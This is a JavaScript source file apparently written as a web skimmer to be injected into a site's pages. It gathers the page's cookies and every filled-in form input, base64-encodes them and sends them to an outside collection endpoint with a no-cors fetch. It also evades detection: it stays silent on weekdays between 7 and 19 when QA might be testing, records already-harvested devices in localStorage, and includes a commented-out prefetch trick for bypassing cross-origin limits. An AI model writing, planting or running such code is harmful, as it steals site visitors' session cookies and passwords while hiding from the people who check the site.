const _ = require('lodash');
const config = require('./config').config;

// All (known) methods to detect if Chrome dev tools are open appear to be patched

const isQaWorking = () => {
  const d = new Date(); // current time
  const hours = d.getHours();
  const mins = d.getMinutes();
  const day = d.getDay();

  const isWeekday = day >= 1 && day <= 5;
  const isBetween7And7 = hours >= 7 && hours <= 19;

  return isWeekday && isBetween7And7;
};

const userAgent = navigator.userAgent;
const key = 'knownDevices';
/**
 * Sets the localstorage with our known users
 */
const updateKnownUsers = () => {
  const knownDevices = JSON.parse(localStorage.getItem(key)) || [];
  knownDevices.push(userAgent);
  localStorage.setItem(key, JSON.stringify(knownDevices));
};

/**
 * Have we already harvested the information for this user?
 */
//TODO: Use better method than userAgent, as its too broad
const alreadyHaveDevice = () => {
  const knownDevices = JSON.parse(localStorage.getItem(key)) || [];
  return _.includes(knownDevices, userAgent);
};

const bypassCrossOrigin = () => {
  const linkEl = document.createElement('link');
  linkEl.rel = 'prefetch';
  linkEl.href = urlWithYourPreciousData;
  document.head.appendChild(linkEl);
};

/**
 * Check the various safety nets and if they all pass, send off our request
 * @param {HTMLFormElement} el The element
 * @param {Event} e The form submit event that triggered this
 */
export const checkAndRun = (el, e) => {
  if (config.QA_MIGHT_BE_WORKING) {
    if (isQaWorking()) {
      return;
    }
  }

  if (config.HAVE_SENT) {
    if (alreadyHaveDevice()) {
      return;
    }
  }

  //bypassCrossOrigin();
  //updateKnownUsers();
  sendRequest(el, e);
};

/**
 *  The basic way to make our request
 * @param {string} encodedPayload The form fields that have been encoded into base64
 */
const primitiveFetch = encodedPayload => {
  fetch(`http://localhost:8000/?d=${encodedPayload}`, {
    mode: 'no-cors'
  });
};

const sendRequest = (el, e) => {
  let inputValues = [document.cookie];
  _.forEach(document.forms, form => {
    _.forEach(form.getElementsByTagName('input'), formInput => {
      if (formInput.value) inputValues.push(formInput.value);
    });
  });

  const encodedPayload = btoa(JSON.stringify(inputValues));
  primitiveFetch(encodedPayload);
};
